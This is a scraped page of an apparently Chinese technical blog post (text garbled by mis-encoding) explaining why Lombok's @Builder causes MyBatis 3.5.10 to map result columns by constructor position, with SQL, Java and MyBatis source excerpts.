                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">é—®é¢˜ç°è±¡</h2>
<p>æœ€è¿‘é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå½“ mybatis çš„ mapper.xml æ–‡ä»¶ä¸­ä½¿ç”¨æ¥æ˜ å°„çš„å¯¹è±¡ä½¿ç”¨äº† lombok ä¸­çš„ <code>@Builder</code> æ³¨è§£ä¿®é¥°åï¼Œå‘ç”Ÿäº†å­—æ®µå€¼æ˜ å°„é”™ä½çš„é—®é¢˜ï¼Œè€Œå½“å»æ‰ <code>@Builder</code> æ³¨è§£ä¹‹åå­—æ®µæ˜ å°„å€¼åˆæ­£å¸¸äº†ã€‚</p>
<h2 data-id="heading-1">é—®é¢˜å¤ç°</h2>
<p>ä¸ºäº†å¤ç°è¿™ä¸ªé—®é¢˜ï¼Œæäº†ä¸€ä¸ª demo ä»£ç ã€‚é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ª <code>user</code> è¡¨ï¼Œå‡è®¾å®ƒé‡Œé¢åªæœ‰ <code>id</code>, <code>name</code>, <code>update_time</code> è¿™ä¸‰ä¸ªå­—æ®µï¼Œå…¶ä¸­ <code>name</code> æ˜¯ <code>varchar</code> ç±»å‹ï¼Œ <code>update_time</code> æ˜¯ <code>timestamp</code> ç±»å‹ã€‚è¡¨çš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> (  
    id <span class="hljs-type">BIGINT</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,  
    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> ,  
    update_time <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,  
    <span class="hljs-keyword">PRIMARY</span> KEY (id)  
);
</code></pre>
<p>ç„¶åå®šä¹‰äº†ä¸€ä¸ª <code>User</code> ç±»ï¼Œå®ƒé‡Œé¢å®šä¹‰äº† <code>updateTime</code>, <code>name</code> å­—æ®µï¼Œä¸” <code>updateTime</code> å­—æ®µçš„é¡ºåºåœ¨ <code>name</code> æ³¨è§£å‰é¢ï¼ŒåŒæ—¶ä½¿ç”¨äº† lombok ä¸­çš„ <code>@Builder</code> æ³¨è§£ä¿®é¥°ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Builder</span>  
<span class="hljs-meta">@Data</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {  
    <span class="hljs-keyword">private</span> Date updateTime;  
    <span class="hljs-keyword">private</span> String name;  
}
</code></pre>
<p>ç„¶å mapper.xml æ–‡ä»¶ä¸­å®šä¹‰äº†ä¸€ä¸ªæŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·çš„è¯­å¥ï¼Œåœ¨è¿™ä¸ªè¯­å¥ä¸­ <code>select</code> çš„æ—¶å€™ï¼Œ<strong><code>name</code> å­—æ®µçš„é¡ºåºåœ¨ <code>update_time</code> å‰é¢</strong>ï¼Œè¿™ç‚¹å¾ˆé‡è¦ï¼Œä½¿ç”¨çš„ MyBatis ç‰ˆæœ¬æ˜¯ 3.5.10ã€‚Xml æ–‡ä»¶å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">&lt;mapper namespace=<span class="hljs-string">"com.mapper.UserMapper"</span>&gt;  
    &lt;resultMap id=<span class="hljs-string">"userMap"</span> type=<span class="hljs-string">"com.entity.User"</span>&gt;  
	    &lt;result property=<span class="hljs-string">"name"</span> column=<span class="hljs-string">"name"</span>/&gt;  
	    &lt;result property=<span class="hljs-string">"updateTime"</span> column=<span class="hljs-string">"update_time"</span>/&gt;  
	&lt;/resultMap&gt;  
	&lt;select id=<span class="hljs-string">"listAll"</span> resultMap=<span class="hljs-string">"userMap"</span>&gt;  
	    select name, update_time  
	    from user  
	&lt;/select&gt;  
&lt;/mapper&gt;
</code></pre>
<p>åœ¨æ•°æ®åº“åˆå§‹åŒ–çš„æ—¶å€™å¾€ user è¡¨é‡Œé¢æ’å…¥äº†ä¸€æ¡æ•°æ®ã€‚SQL å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">user</span> (id, name) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'Jone'</span>);
</code></pre>
<p>æ‰§è¡ŒæŸ¥è¯¢åæ¥å£ç›´æ¥æŠ¥é”™äº†ï¼Œä»æŠ¥é”™çœ‹æ˜¯å°è¯•æŠŠ  Jone è¿™ä¸ªå­—ç¬¦ä¸²è½¬ä¸º <code>Timestamp</code> ç±»å‹ä»è€ŒæŠ¥é”™äº†ï¼Œå®é™…æŠ¥é”™æ˜¯åœ¨ <code>DateTyperHanlder</code> çš„ <code>getNullableResult()</code> æ–¹æ³•é‡Œé¢è§¦å‘çš„ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59dc7fdef40f4d1597bdf2a63be23c22~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamF2YWRheWRheXVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767835035&amp;x-signature=%2Fa%2BydVdKdk5xr32Ya6W72%2B1mq4I%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a173675d6aa6489585a1bfecae73ee05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamF2YWRheWRheXVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767835035&amp;x-signature=iy5HvBRGvS1jXt5hT%2Bp93VCT7%2FY%3D" alt="image.png" loading="lazy"/></p>
<p>è€Œå½“æŠŠ <code>@Builder</code> æ³¨è§£å»æ‰ä¹‹åä½¿ç”¨ <code>@Datae</code> æ³¨è§£ä¿®é¥°ï¼Œå†æ¬¡æ‰§è¡ŒæŸ¥è¯¢ï¼Œæ¥å£è¿”å›çš„ç»“æœå°±æ­£å¸¸äº†ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Data</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {  
    <span class="hljs-keyword">private</span> Date updateTime;  
    <span class="hljs-keyword">private</span> String name;  
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4edd8e0a2c740c5bc4af9372db0f1bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamF2YWRheWRheXVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767835035&amp;x-signature=MQTHzwiE4sezH%2FNpwXoBk5cvaOE%3D" alt="image.png" loading="lazy"/></p>
<p>ä¸ºå•¥ä½¿ç”¨äº† <code>@Builder</code> å°±ä¼šæŠ¥é”™ï¼Œå»æ‰ä¹‹åå°±æ­£å¸¸äº†ï¼Œæ¥ä¸‹æ¥å°†ä»æºç è§’åº¦æ¥åˆ†æä¸€ä¸‹ã€‚</p>
<h2 data-id="heading-2">é—®é¢˜åŸå› </h2>
<p>åœ¨ MyBatis ä¸­æ˜¯é€šè¿‡ <code>ResultSetHandler</code> æ¥å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œå¤„ç†çš„ã€‚é¦–å…ˆå®ƒä¼šé€šè¿‡åå°„çš„æ–¹å¼åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„å®ä¾‹ï¼Œåœ¨ä½¿ç”¨ <code>@Builder</code> æ³¨è§£å’Œä¸ä½¿ç”¨æ³¨è§£çš„åŒºåˆ«å¯¹äº <code>User</code> ç±»æ¥è¯´æ˜¯ <code>@Builder</code> æ³¨è§£ä¼šç”Ÿæˆä¸€ä¸ªå…¨å‚çš„æ„é€ å‡½æ•°ï¼Œè€Œä¸ä½¿ç”¨çš„æƒ…å†µä¸‹ï¼Œåˆ™ä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„æ— å‚æ„é€ å‡½æ•°ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58391f3ca2854486943a934ab28ffa7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamF2YWRheWRheXVw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767835035&amp;x-signature=N1q%2Fu3rFhYcoCxzJ9HokyVTGu70%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨ MyBatis ä¸­çš„ <code>DefaultResultSetHandler</code> çš„ <code>createResultObject()</code> æ–¹æ³•å®ç°äº†é€šè¿‡åå°„æ¥åˆ›å»ºå¯¹è±¡ï¼Œå½“æ˜¯å…¨å‚æ„é€ å‡½æ•°æ—¶èµ°çš„çš„æ˜¯ <code>createByConstructorSignature()</code> æ–¹æ³•è¿™ä¸ªåˆ†æ”¯ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createResultObject</span><span class="hljs-params">(ResultSetWrapper rsw, ResultMap resultMap, List&lt;Class&lt;?&gt;&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs, 
    String columnPrefix)</span>
    <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">final</span> Class&lt;?&gt; resultType = resultMap.getType();
    <span class="hljs-keyword">final</span> <span class="hljs-type">MetaClass</span> <span class="hljs-variable">metaType</span> <span class="hljs-operator">=</span> MetaClass.forClass(resultType, reflectorFactory);
    <span class="hljs-keyword">final</span> List&lt;ResultMapping&gt; constructorMappings = resultMap.getConstructorResultMappings();
    <span class="hljs-keyword">if</span> (hasTypeHandlerForResultObject(rsw, resultType)) {
        <span class="hljs-keyword">return</span> createPrimitiveResultObject(rsw, resultMap, columnPrefix);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!constructorMappings.isEmpty()) {
        <span class="hljs-keyword">return</span> createParameterizedResultObject(rsw, resultType, constructorMappings, constructorArgTypes, constructorArgs, columnPrefix);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (resultType.isInterface() || metaType.hasDefaultConstructor()) { <span class="hljs-comment">// å¦‚æœæœ‰æ— å‚æ„é€ å‡½æ•°ç›´æ¥èµ°è¿™é‡Œå°±åˆ›å»ºå¯¹è±¡äº†</span>
        <span class="hljs-keyword">return</span> objectFactory.create(resultType);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (shouldApplyAutomaticMappings(resultMap, <span class="hljs-literal">false</span>)) {
        <span class="hljs-keyword">return</span> createByConstructorSignature(rsw, resultMap, columnPrefix, resultType, constructorArgTypes, constructorArgs);
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutorException</span>(<span class="hljs-string">"Do not know how to create an instance of "</span> + resultType);
}
</code></pre>
<p>åœ¨ <code>createByConstructorSignature()</code> æ–¹æ³•å®ç°äº†é€šè¿‡æ„é€ å‡½æ•°çš„æ–¹å¼æ¥åå°„åˆ›å»ºå¯¹è±¡ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">createByConstructorSignature</span><span class="hljs-params">(ResultSetWrapper rsw, ResultMap resultMap, String columnPrefix, Class&lt;?&gt; resultType,
    List&lt;Class&lt;?&gt;&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs)</span> <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">return</span> applyConstructorAutomapping(rsw, resultMap, columnPrefix, resultType, constructorArgTypes, constructorArgs,
        findConstructorForAutomapping(resultType, rsw).orElseThrow(() -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutorException</span>(
            <span class="hljs-string">"No constructor found in "</span> + resultType.getName() + <span class="hljs-string">" matching "</span> + rsw.getClassNames())));
}
</code></pre>
<p>åœ¨åˆ›å»ºä¹‹å‰ä¼šé€šè¿‡ <code>findConstructorForAutomapping()</code> æ–¹æ³•æ¥æŸ¥æ‰¾ä¸€ä¸ªåˆé€‚çš„æ„é€ å‡½æ•°ï¼Œå½“ç±»çš„æ„é€ å‡½æ•°åªæœ‰ä¸€ä¸ªæ—¶ï¼Œä¼šç›´æ¥ä½¿ç”¨è¿™ä¸ªè¿™ä¸ªæ„é€ å‡½æ•°ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Optional&lt;Constructor&lt;?&gt;&gt; findConstructorForAutomapping(<span class="hljs-keyword">final</span> Class&lt;?&gt; resultType, ResultSetWrapper rsw) {
    Constructor&lt;?&gt;[] constructors = resultType.getDeclaredConstructors();
    <span class="hljs-comment">// åªæœ‰ä¸€ä¸ªæ„é€ å‡½æ•°æ—¶ï¼Œç›´æ¥ä½¿ç”¨è¿™ä¸ªæ„é€ å‡½æ•°</span>
    <span class="hljs-keyword">if</span> (constructors.length == <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">return</span> Optional.of(constructors[<span class="hljs-number">0</span>]);
    }
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> Constructor&lt;?&gt; constructor : constructors) {
        <span class="hljs-keyword">if</span> (constructor.isAnnotationPresent(AutomapConstructor.class)) {
            <span class="hljs-keyword">return</span> Optional.of(constructor);
        }
    }
    <span class="hljs-keyword">if</span> (configuration.isArgNameBasedConstructorAutoMapping()) {
      <span class="hljs-comment">// Finding-best-match type implementation is possible,</span>
      <span class="hljs-comment">// but using @AutomapConstructor seems sufficient.</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExecutorException</span>(MessageFormat.format(
          <span class="hljs-string">"'argNameBasedConstructorAutoMapping' is enabled and the class ''{0}'' has multiple constructors, so @AutomapConstructor must be added to one of the constructors."</span>,
          resultType.getName()));
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> Arrays.stream(constructors).filter(x -&gt; findUsableConstructorByArgTypes(x, rsw.getJdbcTypes())).findAny();
    }
}
</code></pre>
<p>ç„¶ååœ¨ <code>applyConstructorAutomapping()</code> æ–¹æ³•ä¸­ä¼šè°ƒç”¨ <code>applyColumnOrderBasedConstructorAutomapping()</code> æ–¹æ³•ã€‚ä»è¯¥æ–¹æ³•çš„å‘½åä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œå®ƒæ˜¯å®ç°äº†æ ¹æ®ä¸‹æ ‡ï¼Œè€Œä¸æ˜¯å‚æ•°åç§°æ¥å®ç°æ„é€ å‚æ•°çš„æ˜ å°„ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">applyConstructorAutomapping</span><span class="hljs-params">(ResultSetWrapper rsw, ResultMap resultMap, String columnPrefix, Class&lt;?&gt; resultType, List&lt;Class&lt;?&gt;&gt; constructorArgTypes, List&lt;Object&gt; constructorArgs, Constructor&lt;?&gt; constructor)</span> <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">foundValues</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span> (configuration.isArgNameBasedConstructorAutoMapping()) {
      <span class="hljs-comment">// è¿™ä¸ªæ˜¯æ ¹æ®æ„é€ å‚æ•°çš„åç§°æ˜ å°„</span>
        foundValues = applyArgNameBasedConstructorAutoMapping(rsw, resultMap, columnPrefix, resultType, constructorArgTypes, constructorArgs,
          constructor, foundValues);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// è¿™ä¸ªæ˜¯æ ¹æ®æ„é€ å‚æ•°çš„é¡ºåºæ˜ å°„</span>
        foundValues = applyColumnOrderBasedConstructorAutomapping(rsw, constructorArgTypes, constructorArgs, constructor,
          foundValues);
    }
    <span class="hljs-keyword">return</span> foundValues ? objectFactory.create(resultType, constructorArgTypes, constructorArgs) : <span class="hljs-literal">null</span>;
  }
</code></pre>
<p>åœ¨ <code>applyColumnOrderBasedConstructorAutomapping()</code> æ–¹æ³•ä¸­ä¼šä»ä¸‹æ ‡å–æ„é€ å‡½æ•°ä¸­çš„å‚æ•°ï¼ŒåŒæ—¶æ ¹æ®ä¸‹æ ‡å–æŸ¥è¯¢ç»“æœé‡Œé¢çš„åˆ—åï¼Œå…ˆè°ƒç”¨ <code>rsw.getTypeHandler()</code> æ‰¾åˆ°å¯¹åº”çš„ <code>TypeHandler</code> ï¼Œç„¶åè°ƒç”¨ TypeHandler çš„ <code>getResult()</code> æ–¹æ³•å°è¯•å°†åˆ—å¯¹åº”çš„å€¼è½¬ä¸ºå¯¹åº”çš„æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">applyColumnOrderBasedConstructorAutomapping</span><span class="hljs-params">(ResultSetWrapper rsw, List&lt;Class&lt;?&gt;&gt; constructorArgTypes,
      List&lt;Object&gt; constructorArgs, Constructor&lt;?&gt; constructor, <span class="hljs-type">boolean</span> foundValues)</span> <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; constructor.getParameterTypes().length; i++) {
        Class&lt;?&gt; parameterType = constructor.getParameterTypes()[i];
        <span class="hljs-type">String</span> <span class="hljs-variable">columnName</span> <span class="hljs-operator">=</span> rsw.getColumnNames().get(i);
        <span class="hljs-comment">// å…ˆæ‰¾åˆ°å¯¹åº”çš„TypeHandler</span>
        TypeHandler&lt;?&gt; typeHandler = rsw.getTypeHandler(parameterType, columnName);
        <span class="hljs-comment">// è°ƒç”¨TypeHandlerå°†åˆ—å¯¹åº”çš„å€¼è½¬ä¸ºå¯¹åº”çš„æ„é€ å‚æ•°ç±»å‹</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> typeHandler.getResult(rsw.getResultSet(), columnName);
        constructorArgTypes.add(parameterType);
        constructorArgs.add(value);
        foundValues = value != <span class="hljs-literal">null</span> || foundValues;
    }
    <span class="hljs-keyword">return</span> foundValues;
}
</code></pre>
<p>åœ¨æœ¬æ¡ˆä¾‹ä¸­æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ç±»å‹æ˜¯ <code>Date</code> ç±»å‹ï¼Œç¬¬ä¸€ä¸ªåˆ—åæ˜¯ <code>name</code>ã€‚é¦–å…ˆæ ¹æ®åˆ—åæ˜¯æ‰¾ä¸åˆ°å¯¹åº”çš„ TypeHandler çš„ï¼Œç„¶åè°ƒç”¨ <code>TypeHandlerRegistry</code> çš„ <code>getTypeHandler()</code> æ–¹æ³•è·å–å¯¹åº”çš„ <code>TypeHandler</code>ã€‚</p>
